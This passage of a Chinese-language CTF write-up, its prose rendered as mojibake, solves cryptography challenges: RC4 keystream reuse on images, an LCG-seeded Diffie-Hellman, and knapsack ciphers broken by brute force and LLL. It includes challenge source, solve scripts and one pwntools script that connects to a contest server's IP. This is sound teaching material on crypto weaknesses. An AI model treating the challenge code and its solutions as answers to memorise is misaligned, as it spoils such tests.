è¿™ä¸€é¢˜çš„åˆ‡å…¥ç‚¹åœ¨é¢˜ç›®æ‰€ä½œçš„ä¸¤æ¬¡testã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°Plaintext1å’ŒPlaintext1ç›¸å·®äº†ä¸€ä¸ªå­—èŠ‚ã€‚ç„¶åä¸¤æ¬¡åŠ å¯†ç”¨çš„æ˜¯åŒæ ·çš„keyï¼Œè¿™ä¹Ÿå°±æ„å‘³ç€ä¸¤æ¬¡ç”¨äºåŠ å¯†æ˜æ–‡çš„å¯†é’¥æµæ˜¯ä¸€æ¨¡ä¸€æ ·çš„ã€‚æ‰€ä»¥åŠ å¯†ä¸¤æ¬¡å›¾ç‰‡çš„å¯†é’¥æµåˆšå¥½æœ‰ä¸€ä½çš„é”™ä½ã€‚

é‰´äºRC4åŠ å¯†çš„ç‰¹æ€§ï¼Œå½“æˆ‘ä»¬æœ‰ä¸€å¯¹æ˜æ–‡ã€å¯†æ–‡æˆ‘ä»¬æ˜¯å¯ä»¥çŸ¥é“å¯†é’¥çš„ã€‚ç„¶åæˆ‘ä»¬å¯ä»¥åˆ©ç”¨Plaintext2å¤šå‡ºæ¥çš„é‚£ä¸€ä¸ªå­—èŠ‚æ¥çŸ¥é“ç¬¬ä¸€æ¬¡åŠ å¯†å›¾ç‰‡çš„ç¬¬ä¸€ä½å¯†é’¥ã€‚ç„¶åç”¨è¿™ä¸ªå¯†é’¥å»è§£å¯†ï¼Œå¾—åˆ°ç¬¬ä¸€æ¬¡åŠ å¯†çš„å›¾ç‰‡çš„ç¬¬ä¸€ä¸ªåƒç´ ç‚¹ã€‚æœ‰äº†å›¾ç‰‡çš„åŸå§‹çš„ç¬¬ä¸€ä¸ªåƒç´ ç‚¹ï¼Œæˆ‘ä»¬ä¹Ÿæœ‰ç¬¬äºŒæ¬¡åŠ å¯†çš„å›¾ç‰‡åŠ å¯†åçš„åƒç´ ç‚¹ï¼Œåˆ©ç”¨è¿™ä¸¤ä¸ªç‚¹æˆ‘ä»¬èƒ½è·å¾—ç¬¬ä¸€æ¬¡åŠ å¯†å›¾ç‰‡çš„ç¬¬äºŒä¸ªkeyã€‚å¦‚æ­¤å¾ªç¯å¾€å¤ï¼Œæ¥å›æ¨ªè·³ï¼Œå°±å¯ä»¥æœ€ç»ˆæ¢å¤ç¬¬ä¸€æ¬¡åŠ å¯†çš„å›¾ç‰‡

exp

```
from numpy import array
from PIL import Image

p1 = "g"
P2 = ""
c1=0x19
c2=""

k1 = ord(p1)^c1


flag_file1 = Image.open(r"enc1.png")
flag_file2 = Image.open(r"enc2.png")
img1 = array(flag_file1)
img2 = array(flag_file2)
a, b, _ = img1.shape
for x in range(0, a):
    for y in range(0, b):
        pixel1 = img1[x, y]
        pixel2 = img2[x, y]
        for i in range(0, 3):
            pixel2[i] = pixel2[i] ^ k1
            k1 = pixel2[i]^pixel1[i]
        img2[x][y] = pixel2
enc2 = Image.fromarray(img2)

enc2.save("flag.png")
```

å¾—åˆ°å›¾ç‰‡

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://i.loli.net/2020/05/24/5lYRkX41n6dmNKh.png)

### <a class="reference-link" name="easyLCG"></a>easyLCG

```
from Crypto.Util.number import*
from secret import flag


class LCG:
    def __init__(self):
        self.a = getRandomNBitInteger(32)
        self.b = getRandomNBitInteger(32)
        self.m = getPrime(32)
        self.seed = getRandomNBitInteger(32)

    def next(self):
        self.seed = (self.a*self.seed+self.b) % self.m
        return self.seed &gt;&gt; 16

    def output(self):
        print("a = `{``}`nb = `{``}`nm = `{``}`".format(self.a, self.b, self.m))
        print("state1 = `{``}`".format(self.next()))
        print("state2 = `{``}`".format(self.next()))


class DH:
    def __init__(self):
        self.lcg = LCG()
        self.lcg.output()
        self.g = getRandomNBitInteger(128)
        self.m = getPrime(256)
        self.A, self.a = self.gen_AB()
        self.B, self.b = self.gen_AB()
        self.key = pow(self.A, self.b, self.m)

    def gen_AB(self):
        x = ''
        for _ in range(64):
            x += '1' if self.lcg.next() % 2 else '0'
        return pow(self.g, int(x, 2), self.m), int(x, 2)


DH = DH()
flag = bytes_to_long(flag)
print("g = `{``}`nA = `{``}`nB = `{``}`nM = `{``}`".format(DH.g, DH.A, DH.B, DH.m))
print("Cipher = `{``}`".format(flag ^ DH.key))

'''
a = 3844066521
b = 3316005024
m = 2249804527
state1 = 16269
state2 = 4249
g = 183096451267674849541594370111199688704
A = 102248652770540219619953045171664636108622486775480799200725530949685509093530
B = 74913924633988481450801262607456437193056607965094613549273335198280176291445
M = 102752586316294557951738800745394456033378966059875498971396396583576430992701
Cipher = 13040004482819935755130996285494678592830702618071750116744173145400949521388647864913527703
'''
```

è¿™ä¸€é“é¢˜ä¸¤ä¸ªçŸ¥è¯†ç‚¹ï¼Œä¸€ä¸ªæ˜¯LCGï¼Œä¸€ä¸ªæ˜¯DHPï¼Œå…¶ä¸­ï¼ŒDHPç”¨äºåŠ å¯†flagï¼Œæˆ‘ä»¬è¦å¾—åˆ°flagå°±è¦è·å¾—åå•†å¯†é’¥ã€‚è€Œè·å¾—åå•†å¯†é’¥çš„æ–¹æ³•å°±æ˜¯çŸ¥é“ä¸€æ–¹çš„ç§é’¥ã€‚è€ŒåŒæ–¹çš„ç§é’¥ä½¿ç”¨LCGç”Ÿæˆçš„ã€‚

LCGä¸­çš„ä¸‰ä¸ªå‚æ•°a,b,mæˆ‘ä»¬éƒ½çŸ¥é“ã€‚ç„¶åç»™å‡ºäº†s1 å’Œ s2 çš„é«˜ä½ã€‚ä½16ä½æœªçŸ¥ã€‚è¿™é‡Œå®Œå…¨å¯ä»¥çˆ†ç ´ã€‚

çˆ†ç ´s1ï¼Œç„¶åç”Ÿæˆs2ï¼Œçœ‹é«˜ä½æ˜¯å¦ä¸ç»™å‡ºçš„s2é«˜ä½ä¸€è‡´æ¥ç¡®å®šã€‚æœ€ç»ˆçˆ†å‡ºå››ä¸ªç¬¦åˆçš„å€¼ã€‚

ç„¶åå°±åˆ©ç”¨å››ä¸ªå¯èƒ½çš„s2å’Œa, b, mï¼Œæ ¹æ®é¢˜ç›®ç”Ÿæˆå¯†é’¥çš„æ–¹å¼æ¥ç”ŸæˆAçš„å››ä¸ªå¯èƒ½ç§é’¥ã€‚å†åˆ©ç”¨Bçš„å…¬é’¥è·å¾—å››ä¸ªåå•†å¯†é’¥ã€‚ç„¶åçœ‹è§£å¯†ç»“æœï¼Œæ‰¾å‡ºflagã€‚

exp:

```
from Crypto.Util.number import *
a = 3844066521
b = 3316005024
m = 2249804527
state1 = 16269
state2 = 4249
M = 102752586316294557951738800745394456033378966059875498971396396583576430992701
B = 74913924633988481450801262607456437193056607965094613549273335198280176291445
A = 102248652770540219619953045171664636108622486775480799200725530949685509093530
c = 13040004482819935755130996285494678592830702618071750116744173145400949521388647864913527703

for i in range(2**16):
    s = state1&lt;&lt;16
    s+=i
    if ((a*s+b)%m)&gt;&gt;16 == 4249:
        s2 = (a*s+b)%m
        print s2
        x=''
        for _ in range(64):
            s2 = (a*s2+b)%m
            x += '1' if (s2&gt;&gt;16) % 2 else '0'
        x = int(x,2)
        key = pow(B,x,M)
        flag = key^c
        print long_to_bytes(flag)
```

### <a class="reference-link" name="knapsack"></a>knapsack

```
from Crypto.Util.number import *
from functools import reduce

def genKey(length):
    A, B = getPrime(64), getPrime(1025)

    Rn = getPrime(1024)
    key1 = [Rn//2**i for i in range(1, length+1)]
    key2 = [i*A % B for i in key1]
    return key1,key2


def encrypt(text,key):
    Sum=0
    for i in range(len(text)):
        Sum+=int(text[i])*key[i]
    return Sum

def save(Ciper,Key):
    f1=open("pub.txt","w")
    for i in range(len(Key)):
        f1.write(str(Key[i])+'n')
    f2=open("cip.txt","w")
    f2.write(hex(Ciper))


FLAG = bin(bytes_to_long(flag.encode()))[2:]
Key1,Key2 = genKey(len(FLAG))
Ciper = encrypt(FLAG,Key1)
save(Ciper,Key2)
```

è¿™æ˜¯ä¸€ä¸ªè¶…é€’å¢èƒŒåŒ…é—®é¢˜ã€‚ä½†è¿™é‡Œç”¨çš„æ˜¯ä¸€ä¸ªè¶…é€’å‡åºåˆ—

å¹¶ä¸”å¯¹è¿™ä¸ªåºåˆ—åšäº†ä¸€æ¬¡åŠ å¯†ï¼ŒåŠ å¯†æ–¹å¼ä¸º a*A % Bï¼Œå…¶ä¸­xä¸ºåºåˆ—ä¸­çš„æ¯ä¸€ä¸ªå…ƒç´ ï¼ŒBå¤§äºåºåˆ—ä¸­æœ€å¤§çš„å…ƒç´ ã€‚

æƒ³è¦è§£å¯†ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦è·å¾—Aå’ŒBï¼Œç„¶åæ¥é€šè¿‡æ±‚é€†æ¥è·å¾—åŸåºåˆ—ã€‚

è·å¾—Açš„æ–¹å¼å¾ˆç®€å•ã€‚è¿™ä¸ªåºåˆ—çš„æœ€å°çš„å€¼å¾ˆå°ï¼Œè¿™ä¸ªæ—¶å€™ç”¨ä¸åˆ°æ¨¡è¿ç®—ï¼Œæˆ‘ä»¬åªéœ€è¦å¯¹æ¯”è¾ƒå°çš„ä¸¤ä¸ªå€¼æ±‚ä¸€ä¸ªæœ€å¤§å…¬å› æ•°å°±èƒ½å¾—åˆ°Aã€‚

è‡³äºæ±‚Bï¼Œæˆ‘ä»¬æ‰¾åˆ°æ¯”è¾ƒå¤§çš„ä¸¤ä¸ªæ•°ï¼Œå¹¶ä¸”æ»¡è¶³å¦‚ä¸‹å…³ç³»ï¼Œå³$a**`{`i+1`}` &lt; a**`{`i`}`$ï¼Œï¼ˆæˆ‘ä»¬è®¾æœ€å°çš„ä¸º$a**0$ï¼‰è¿™æ˜¯ä¸ç¬¦åˆåºåˆ—çš„å•è°ƒæ€§çš„ï¼Œä¹Ÿå°±æ„å‘³ç€è¿™é‡Œå­˜åœ¨ä¸€æ¬¡æ¨¡è¿ç®—ã€‚ä¸”è¿™é‡Œçš„é€’å‡æ˜¯ç”¨æ•´é™¤2æ¥å¾—åˆ°çš„ã€‚æ‰€ä»¥è¦ä¹ˆ$a**`{`i`}`cdot 2 â€“ a**`{`i+1`}` = B$ï¼Œè¦ä¹ˆ$a**`{`i`}`cdot 2 + A â€“ a_`{`i+1`}` = B$ ã€å› ä¸ºè¿™é‡Œæ˜¯æ•´é™¤å˜›ï¼Œè¿™ä¸éš¾ç†è§£ã€‘

æœ‰äº†åŸæ¥çš„è¶…é€’å‡åºåˆ—ï¼Œè¿™ä¸ªé—®é¢˜å°±å¾ˆç®€å•äº†ã€‚æˆ‘ä»¬åªéœ€è¦å¯¹è¿™ä¸ªåºåˆ—ä»å¤´å¼€å§‹åˆ¤æ–­ã€‚å¦‚æœå¯†æ–‡å¤§äºè¿™ä¸ªå…ƒç´ ï¼Œflagçš„æœ€é«˜ä½bitå°±æ˜¯1ï¼Œç„¶åå°†å¯†æ–‡å‡å»è¿™ä¸ªå…ƒç´ ã€‚å¦åˆ™flagçš„è¿™ä¸€ä¸ªbitä½å°±æ˜¯0ï¼Œç»§ç»­ä¸‹ä¸€ä¸ªå…ƒç´ ä¸å¯†æ–‡çš„å¤§å°åˆ¤æ–­ã€‚å¦‚æ­¤å¾ªç¯ã€‚æœ€åè§£å¯†å¾—åˆ°flagã€‚

exp:

```
b=335428611041311731398614259824482604248524861615176787429946575184146370361110652887115402376826444538743339055691850202034085349274540292019392290484025358504275054761608502214481606484088807087063751542648223811793597463026662881020647708165593980984857948283181770647446888695205803952635117800114545071259
a=11243098275181678343
with open("pub.txt")as f:
    data=f.read()

data=data.split("n")[:-1]
datai=[]
for i in data:
    datai.append(int(i))
dataii=[] 
for i in datai:
    dataii.append(i*inverse(a,b)%b)

c=0x8ab3086a3df540d4652c191951756a6574aca491d933e479330532f0586ce03862f82f36dea8038b8bfb0b394331d7a93050efa2a26e46d9d8ca394600456cd79e02890a2c31b02e920c28a9f27c3943ec68fe5555ff4056358f35869859d67d67702edf44b10a7690acbaeea1f4def46392922069bfb71c173a210e9ab384f7
flag=""
for i in dataii:
    if c&gt;=i:
        flag+='1'
        c-=i
    else:
        flag+='0'
print long_to_bytes(int(flag,2))
```

### <a class="reference-link" name="Backpacker"></a>Backpacker

```
import signal
import string
from hashlib import sha256
from Crypto.Util.number import *
from Crypto.Random import random
flag = 'flag'

banner = '''
 ____             _                     _             _       _   _ 
| __ )  __ _  ___| | ___ __   __ _  ___| | _____ _ __( )___  | | | | ___  _ __ ___   ___
|  _  / _` |/ __| |/ / '_  / _` |/ __| |/ / _  '__|// __| | |_| |/ _ | '_ ` _  / _ \
| |_) | (_| | (__|   &lt;| |_) | (_| | (__|   &lt;  __/ |    __  |  _  | (_) | | | | | |  __/
|____/ __,_|___|_|_ .__/ __,_|___|_|____|_|    |___/ |_| |_|___/|_| |_| |_|___|
                      |_|'''


def timeout_handler(signum, frame):
    print("n[!]Sorry, timeout...")
    raise TimeoutError


def proof_of_work():
    print("[++++++++++++++++] Proof of work [++++++++++++++++]")
    proof = ''.join(
        [random.choice(string.ascii_letters+string.digits)
         for _ in range(20)]
    )
    proof_cipher = sha256(proof.encode()).hexdigest()
    print("sha256(XXXX+`{``}`) == `{``}`".format(proof[4:], proof_cipher))
    guess = input("Give me XXXX: ")
    if len(guess) != 4 or sha256((guess + proof[4:]).encode()).hexdigest() != proof_cipher:
        print("[++++++++++++++++] You failed, exit... [++++++++++++++++]")
        exit(0)
    print("[++++++++++++++++] Proof of work has passed [++++++++++++++++]")


class Knapsack:
    n = None
    elements = None

    def load(self, n, nbits):
        self.n = n
        self.elements = set()
        while len(self.elements) &lt; n:
            self.elements.add(getRandomNBitInteger(nbits))
        self.elements = list(self.elements)

    def super_load(self, n):
        self.n = n
        self.elements = [233]
        sum = 233
        while len(self.elements) &lt; n:
            self.elements.append(sum + getRandomRange(1, 128))
            sum += self.elements[-1]

    def encrypt(self):
        if not self.n or not self.elements:
            raise ValueError("[!]Something Wrong...")
        m = getRandomNBitInteger(self.n)
        m_list = [int(_) for _ in bin(m)[2:]]
        c = 0
        for i in range(self.n):
            c += m_list[i] * self.elements[i]
        return (c, m)


def challenge_1():
    print("[++++++++++++++++] Enjoy challenge_1 [++++++++++++++++]")
    K = Knapsack()
    K.load(10, 16)
    print("[+]There are `{``}` elements in the knapsack.".format(K.n))
    for i in range(K.n):
        print(K.elements[i])
    (c, m) = K.encrypt()
    print("[+]c = `{``}`".format(c))
    guess = input("[-]m(hex) = ")
    try:
        guess = int(guess, 16)
        if guess == m:
            print("[++++++++++++++++] challenge_1 has passed [++++++++++++++++]")
            return
    except:
        pass
    print("[++++++++++++++++] You failed, exit... [++++++++++++++++]")
    exit(0)


def challenge_2():
    print("[++++++++++++++++] Enjoy challenge_2 [++++++++++++++++]")
    K = Knapsack()
    K.super_load(50)
    print("[+]There are `{``}` elements in the knapsack.".format(K.n))
    for i in range(K.n):
        print(K.elements[i])
    (c, m) = K.encrypt()
    print("[+]c = `{``}`".format(c))
    guess = input("[-]m(hex) = ")
    try:
        guess = int(guess, 16)
        if guess == m:
            print("[++++++++++++++++] challenge_2 has passed [++++++++++++++++]")
            return
    except:
        pass
    print("[++++++++++++++++] You failed, exit... [++++++++++++++++]")
    exit(0)


def challenge_3():
    print("[++++++++++++++++] Enjoy challenge_3 [++++++++++++++++]")
    K = Knapsack()
    K.load(100, 312)
    print("[+]There are `{``}` elements in the knapsack.".format(K.n))
    for i in range(K.n):
        print(K.elements[i])
    (c, m) = K.encrypt()
    print("[+]c = `{``}`".format(c))
    guess = input("[-]m(hex) = ")
    try:
        guess = int(guess, 16)
        if guess == m:
            print("[++++++++++++++++] challenge_3 has passed [++++++++++++++++]")
            print("[+]Excellent Backpacker, your flag is `{``}`".format(flag))
            return
    except:
        pass
    print("[++++++++++++++++] You failed, exit... [++++++++++++++++]")
    exit(0)


def main():
    proof_of_work()
    challenge_1()
    challenge_2()
    challenge_3()


if __name__ == "__main__":
    try:
        print(banner)
        signal.signal(signal.SIGALRM, timeout_handler)
        signal.alarm(6000000)
        main()
    except:
        pass
```

ä¹Ÿæ˜¯èƒŒåŒ…é—®é¢˜ï¼Œä¸€å…±ä¸‰å…³ã€‚

ç¬¬ä¸€å…³ï¼Œç”±äºæ•°å­—å¾ˆå°ã€‚èŒƒå›´æ˜¯0åˆ°1023ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥çˆ†ç ´å¾—åˆ°ã€‚

ç¬¬äºŒå…³ï¼Œæ˜¯è¶…é€’å¢èƒŒåŒ…é—®é¢˜ã€‚è·Ÿä¸Šé¢é‚£ä¸ªä¸€æ ·çš„ã€‚

ç¬¬ä¸‰å…³ï¼Œä¸æ˜¯è¶…é€’å¢èƒŒåŒ…é—®é¢˜äº†ï¼Œç„¶åé‡æ¯”è¾ƒå¤§ï¼Œæ•°å­—ä¹Ÿæ¯”è¾ƒå¤§ã€‚è¿™é‡Œç”¨Latiiceå¯ä»¥è§£å†³ã€‚æ ¼é•¿è¿™æ ·

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://i.loli.net/2020/05/24/xuzFv2IAJNlqC6y.png)

ç„¶åè§£èµ·æ¥æœ‰æ¦‚ç‡é—®é¢˜ã€‚å°±ç®—æ ¼åŸºè§„çº¦æ‰¾åˆ°äº†SVPä¸ºæˆ‘ä»¬çš„ç›®æ ‡å‘é‡ï¼Œæœ€åä¹Ÿä¼šæœ‰ä¸¤ä¸ªè§£ï¼Œä¹Ÿåªæœ‰1/2çš„æ¦‚ç‡æˆåŠŸã€‚ç”±äºæœ¬åœ°æ²¡æœ‰sageç¯å¢ƒï¼Œè¿™é‡Œæ˜¯åŠè‡ªåŠ¨è„šæœ¬

äº¤äº’è„šæœ¬ï¼Œå¯ä»¥æ‰“åˆ°ç¬¬ä¸‰å…³ï¼Œç„¶åæ‹¿åˆ°æ•°æ®

```
import string 
from Crypto.Util.number import getPrime as getprime ,long_to_bytes,bytes_to_long,inverse
from pwn import *
from pwnlib.util.iters import mbruteforce
from hashlib import sha256
context.log_level = "debug"
def enc(data,m):
    m = bin(m)[2:]
    c = 0
    for i in range(len(m)):
        c += int(m[i])*data[i]
    return c

sh=remote("183.129.189.60","10036")
sh.recvuntil("sha256(XXXX+")
suffix=sh.recv(len('SLhlaef5L6nM6pYx'))
sh.recvuntil("== ")
cipher=sh.recv(len('3ade7863765f07a3fbb9d853a00ffbe0485c30eb607105196b0d1854718a7b6c'))
sh.recvuntil("XXXX: ")
proof = mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest() == cipher, string.ascii_letters + string.digits, length=4, method='fixed')

sh.sendline(proof)
sh.recvuntil("knapsack.n")
data=[]
for _ in range(10):
    data.append(int(sh.recvline()[:-1]))
#print(data)
sh.recvuntil("[+]c = ")
c = int(sh.recvuntil("n")[:-1])

for i in range(2**10):
    if enc(data,i) == c:
        print i
        sh.sendline(hex(i)[2:])
        break
else:
    print "no"
sh.recvuntil("knapsack.n")
data=[]
for _ in range(50):
    data.append(int(sh.recvline()[:-1]))
#print(data)

data.reverse()
sh.recvuntil("[+]c = ")
c = int(sh.recvuntil("n")[:-1])
m=""
for i in data:
    if c&gt;=i:
        m+='1'
        c-=i
    else:
        m+='0'
print c
if enc(data,int(m,2)) :
    m = m[::-1]
m = int(m,2)
sh.sendline(hex(m)[2:])
sh.recvuntil("knapsack.n")
data=[]
for _ in range(100):
    data.append(int(sh.recvline()[:-1]))

print("a = "+str(data).replace("L",""))
sh.recvuntil("[+]c = ")
c = int(sh.recvuntil("n")[:-1])
print("s = "+str(c))

sh.interactive()
```

æ‹¿åˆ°æ•°æ®äº†å»ç”¨sageè§£å¯†

```
a = #å¡«å…¥åºåˆ—a
s = #å¡«å…¥å¯†æ–‡å€¼

m=[]
for i in range(100):
    b=[]
    for j in range(100):
        if i == j:
            b.append(1)
        else:
            b.append(0)
    m.append(b)

b=[]
for i in range(100):
    m[i].append(2**156*a[i])
    b.append(1/2)

b.append(2**156*s)
m.append(b)
#print(len(m[0])) 
M = matrix(QQ, m)
v = M.LLL()[0]
print(v)
flag=''
for i in v[:-1]:
    if i &lt; 0:
        flag+='0'
    else:
        flag+='1'
print(hex(int(flag,2))[2:])
```

ç„¶åæäº¤ï¼Œç¢°ç‚¹è¿æ°”ã€‚
